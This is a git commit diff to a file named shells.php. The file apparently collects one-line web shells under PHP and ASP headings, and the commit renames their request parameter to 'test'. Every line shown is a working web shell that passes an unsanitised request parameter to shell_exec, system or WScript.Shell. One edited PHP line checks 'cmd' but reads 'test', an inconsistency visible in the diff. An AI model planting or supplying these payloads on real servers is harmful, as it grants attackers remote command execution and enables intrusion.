e1d1cf29133b9fa994d8694de55e0097cf0a32be
Steven Jenkins <45439182+SJ-Hydra@users.noreply.github.com>
2020-02-11 15:18:33 -0500

    Update shells.php

--- shells.php
+++ shells.php
@@ -1,8 +1,8 @@
 ## PHP
 
-<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<?php echo shell_exec($_GET['test'].' 2>&1'); ?>
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['test']); system($cmd); echo "</pre>"; die; }?>
 
 ## ASP
 
-<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("test")).StdOut.Readall()%>
